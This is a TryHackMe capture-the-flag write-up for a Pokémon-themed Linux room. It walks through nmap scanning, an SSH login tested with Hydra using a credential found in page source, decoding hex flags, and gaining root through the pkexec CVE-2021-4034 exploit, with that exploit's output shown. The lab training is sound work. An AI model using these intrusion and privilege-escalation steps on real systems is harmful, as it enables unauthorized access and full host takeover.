---
title: "Gotta Catchem All"
date: 2025-02-11
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Gotta Catchem All
categories: [TryHackMe, Easy]
tags: [linux, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Gotta Catch'em All!</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>This room is based on the original Pokemon series. Can you obtain all the Pokemon in this room?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/pokemon">https://tryhackme.com/room/pokemon</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Gotta Catch'em All!.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.142.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:54 EDT
Nmap scan report for 10.10.142.177
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 46.07 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.142.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:55 EDT
Nmap scan report for 10.10.142.177
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:14:75:69:1e:a9:59:5f:b2:3a:69:1c:6c:78:5c:27 (RSA)
|   256 23:f5:fb:e7:57:c2:a5:3e:c2:26:29:0e:74:db:37:c2 (ECDSA)
|_  256 f1:9b:b5:8a:b9:29:aa:b6:aa:a2:52:4a:6e:65:95:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Can You Find Them All?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The web server displayed the Apache2 default web page. I began by analyzing the source code, where one comment caught my attention:
```html
  <pokemon>:<h[removed]n>
  <!--(Check console for extra surprise!)-->
```

Before proceeding with the first string, I opened the console, and the following list of Pokémon's where displayed:
```text
Bulbasaur 
Charmander 
Squirtle 
Snorlax 
Zapdos
Mew
Charizard 
Grimer
Metapod
Magikarp 
```

At this point, I wasn't sure if the list of Pokémon's was something like a username or password list. I began testing combinations using Hydra and got a match:
```bash   
$ hydra -l 'pokemon' -p 'h[removed]n' ssh://10.10.142.177         
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-14 11:09:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.10.142.177:22/
[22][ssh] host: 10.10.142.177   login: pokemon   password: h[removed]n
```

Since I found a valid credential combination, I was able to connect via SSH:
```bash
kali@kali:~/ctf/pokemon$ ssh pokemon@10.10.142.177

pokemon@root:~$ 
```

I continued by enumerating the system and found an interesting ZIP archive. After unzipping it, I discoverd an interesting file:
```bash
pokemon@root:~Desktop$ ls
  P0kEmOn.zip
pokemon@root:~/Desktop$ unzip P0kEmOn.zip 
Archive:  P0kEmOn.zip
   creating: P0kEmOn/
  inflating: P0kEmOn/grass-type.txt  
pokemon@root:~/Desktop$ ls
  P0kEmOn  P0kEmOn.zip
pokemon@root:~/Desktop$ cd P0kEmOn/
pokemon@root:~/Desktop/P0kEmOn$ ls
  grass-type.txt
pokemon@root:~/Desktop/P0kEmOn$ cat grass-type.txt
  50 6f 4b [removed] 75 72 7d
```

It appears to contain hex values, so I pasted the string into CyberChef and was able to decode it:

![Decoding Grass Type](/assets/img/tryhackme/pokemon/thm_pokemon_1.jpg)

I continued enumerating the system and found another file with the same naming pattern as the previous one:
```bash
pokemon@root:/var/www/html$ ls
  index.html  water-type.txt
pokemon@root:/var/www/html$ cat water-type.txt 
  E[removed]}
```

![Decoding Water Type](/assets/img/tryhackme/pokemon/thm_pokemon_2.jpg)

Since the second file followed the same naming pattern as the first, I tried to search for another Pokémon type:
```bash
pokemon@root:/var/www/html$ locate fire-type.txt
  /etc/why_am_i_here?/fire-type.txt
```

![Decoding Fire Type](/assets/img/tryhackme/pokemon/thm_pokemon_3.jpg)

## Privilege Escalation root

I continued by checking for SUID bits and discoverd that pkexec had its SUID bit set. I used the exploit described in CVE-2021-4034 and successfully gained root access:
```bash
pokemon@root:~$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
pokemon@root:~$ python3 exploit.py 
Do you want to choose a custom payload? y/n (n use default payload) n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7fa8a2e7f4e8 at 0x7fa8a2d13668>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
  root
# cd /root
# cat roots-pokemon.txt
  P[removed]!
```

solved! :)